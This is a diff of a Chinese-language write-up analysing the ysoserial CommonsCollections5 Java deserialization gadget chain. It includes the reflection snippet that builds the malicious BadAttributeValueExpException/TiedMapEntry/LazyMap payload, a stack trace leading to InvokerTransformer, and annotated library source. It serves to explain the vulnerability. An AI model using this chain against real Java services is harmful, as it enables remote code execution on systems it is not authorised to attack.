@@ -205,13 +205,31 @@ public class CommonsCollections5 extends PayloadRunner implements ObjectPayload<
 ```
 
 
-- 在Java反序列化中，会调用被反序列化的readObject方法，AnnotationInvocationHandler
+
+## tips
+---
+-  在Java反序列化中，会调用被反序列化的readObject方法
 -  请注意，一个类的对象要想序列化成功，必须满足两个条件：该类必须实现 java.io.Serializable 对象。该类的所有属性必须是可序列化的。如果有一个属性不是可序列化的，则该属性必须注明是短暂的
 
     + 序列化之后保存的是对象的信息
 	+ 被声明为transient的属性不会被序列化，这就是transient关键字的作用
     + 被声明为static的属性不会被序列化，这个问题可以这么理解，序列化保存的是对象的状态，但是static修饰的变量是属于类的而不是属于对象的，因此序列化的时候不会序列化它
 
+
+### Ysoserial CommonsCollections5 序列化了 BadAttributeValueExpException 对象
+设置val 的值为 TiedMapEntry 包装了 lazyMap
+
+
+```java
+final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
+
+TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
+
+BadAttributeValueExpException val = new BadAttributeValueExpException(null);
+Field valfield = val.getClass().getDeclaredField("val");
+valfield.setAccessible(true);
+valfield.set(val, entry);
+```
 
 ## Ysoserial CommonsCollections5 Gadget chain:
 ```
@@ -235,10 +253,21 @@ public class CommonsCollections5 extends PayloadRunner implements ObjectPayload<
 
 ## java-sec-code 中java 反序列化示例执行到exec时的stack
 
+```
+transform:125, InvokerTransformer (org.apache.commons.collections.functors)
+transform:122, ChainedTransformer (org.apache.commons.collections.functors)
+get:151, LazyMap (org.apache.commons.collections.map)
+getValue:73, TiedMapEntry (org.apache.commons.collections.keyvalue)
+toString:131, TiedMapEntry (org.apache.commons.collections.keyvalue)
+readObject:86, BadAttributeValueExpException (javax.management)
+```
+
 ![](/styles/images/2019-5/stack.png)
 
-### BadAttributeValueExpException
+### BadAttributeValueExpException 序列化的对象
 ---
+Java/jdk-12.0.1/lib/src.zip!/java.management/javax/management/BadAttributeValueExpException.java
+
 
 ```java
 public class BadAttributeValueExpException extends Exception   {
@@ -287,7 +316,7 @@ public class BadAttributeValueExpException extends Exception   {
                 || valObj instanceof Byte
                 || valObj instanceof Short
                 || valObj instanceof Boolean) {
-            val = valObj.toString();
+            val = valObj.toString(); //++++++++++++++利用此执行++++++++++++++++++
         } else { // the serialized object is from a version without JDK-8019292 fix
             val = System.identityHashCode(valObj) + "@" + valObj.getClass().getName();
         }
@@ -296,20 +325,80 @@ public class BadAttributeValueExpException extends Exception   {
 
 ```
 
-Ysoserial CommonsCollections5 应该序列化了 BadAttributeValueExpException 对象
-设置val 的值为 lazyMap
+### TiedMapEntry toString()
 
-### lazyMap
+走到TiedMapEntry 的 toString()
+`return this.getKey() + "=" + this.getValue();`
+
+Ysoserial 生成payload时`TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");`
+
+key 为 "foo"   map 是 lazyMap
+
+走到 `lazyMap.get("foo")`
+
 
 ```java
-final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
+public class TiedMapEntry implements Entry, KeyValue, Serializable {
+    private static final long serialVersionUID = -8453869361373831205L;
+    private final Map map;
+    private final Object key;
 
-		TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
+    public TiedMapEntry(Map map, Object key) {
+        this.map = map;
+        this.key = key;
+    }
 
-		BadAttributeValueExpException val = new BadAttributeValueExpException(null);
-		Field valfield = val.getClass().getDeclaredField("val");
-		valfield.setAccessible(true);
-		valfield.set(val, entry);
+    public Object getKey() {
+        return this.key;
+    }
+
+    public Object getValue() {
+        return this.map.get(this.key);
+    }
+
+    public Object setValue(Object value) {
+        if (value == this) {
+            throw new IllegalArgumentException("Cannot set value to this map entry");
+        } else {
+            return this.map.put(this.key, value);
+        }
+    }
+
+    public boolean equals(Object obj) {
+        if (obj == this) {
+            return true;
+        } else if (!(obj instanceof Entry)) {
+            return false;
+        } else {
+            Entry other = (Entry)obj;
+            Object value = this.getValue();
+            return (this.key == null ? other.getKey() == null : this.key.equals(other.getKey())) && (value == null ? other.getValue() == null : value.equals(other.getValue()));
+        }
+    }
+
+    public int hashCode() {
+        Object value = this.getValue();
+        return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode());
+    }
+
+    public String toString() {
+        return this.getKey() + "=" + this.getValue();
+    }
+}
+```
+
+### lazyMap.get("foo")
+
+```java 
+public Object get(Object key) {
+        if (!super.map.containsKey(key)) {
+            Object value = this.factory.transform(key);
+            super.map.put(key, value);
+            return value;
+        } else {
+            return super.map.get(key);
+        }
+    }
 ```
 
 ### ChainedTransformer
